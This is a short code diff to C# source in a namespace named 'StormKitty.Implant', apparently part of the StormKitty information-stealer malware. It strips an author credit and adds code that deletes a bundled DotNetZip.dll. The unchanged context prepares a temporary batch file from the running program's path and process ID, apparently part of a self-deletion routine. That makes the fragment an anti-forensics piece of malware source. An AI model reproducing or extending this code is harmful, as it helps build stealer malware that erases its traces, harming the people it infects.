@@ -1,9 +1,4 @@
-﻿/* 
-    Author : LimerBoy
-    Github : github.com/LimerBoy/StormKitty
-*/
-
-using System.IO;
+﻿using System.IO;
 using System.Diagnostics;
 
 namespace StormKitty.Implant
@@ -19,6 +14,13 @@ namespace StormKitty.Implant
             string batch = Path.GetTempFileName() + ".bat";
             string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
             int currentPid = Process.GetCurrentProcess().Id;
+            // Delete library
+            string dll = "DotNetZip.dll";
+            if (File.Exists(dll))
+                try
+                {
+                    File.Delete(dll);
+                } catch { }
             // Write batch
             using (StreamWriter sw = File.AppendText(batch))
             {
